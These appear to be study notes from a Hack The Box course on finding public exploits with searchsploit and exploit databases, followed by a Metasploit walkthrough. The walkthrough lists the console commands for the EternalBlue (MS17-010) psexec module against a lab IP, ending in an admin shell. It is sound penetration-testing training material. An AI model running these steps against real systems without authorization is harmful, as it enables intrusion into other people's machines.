* Once we identify the services running on ports identified from our `Nmap` scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like `SSH` or `ftp`.

---
### Finding Public Exploits

* Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with `exploit` to see if we get any results.
* A well-known tool for this purpose is `searchsploit`, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:

`sudo apt install exploitdb -y`

* Then, we can use `searchsploit` to search for a specific application by its name, as follows:

`searchsploit openssh 7.2`

* We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/). The [Intro to Web Applications](https://academy.hackthebox.com/module/details/75) module discusses public vulnerabilities for web applications.

---
### Metasploit Primer

* The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:
	- Running reconnaissance scripts to enumerate remote hosts and compromised targets
	- Verification scripts to test the existence of a vulnerability without actually compromising the target
	- Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
	- Many post-exploitation and pivoting tools
* To run `Metasploit`, we can use the `msfconsole` command:

`msfconsole`

* Once we have `Metasploit` running, we can search for our target application with the `search exploit` command. For example, we can search for the SMB vulnerability we identified previously:

`search exploit eternalblue`

* **Tip**: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search
* We found an exploit for this service. We can use it by copying the full name of it and using `USE` to use it:

`use exploit/windows/smb/ms17_010_psexec`
OR
`use 3` = use #

* Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the `show options` command:

`show options`

* Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have two options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the `set` command:

`set RHOSTS 10.10.10.40`

`set LHOST tun0`

* Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

`check`

* As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:

`exploit`

* We have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell.
* These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:
	* Granny - **PWNED**
	* Grandpa 
	- Jerry - **PWNED**
	- Blue - **PWNED**
	- Lame - **PWNED**
	- Optimum
	- Legacy
	- Devel
- `Metasploit` is another essential tool to add to our toolkit, but it is crucial not solely to rely on it. To be well-rounded testers, we must know how to best leverage all of the tools available to us, understand why they sometimes fail, and know when to pivot to manual techniques or other tools.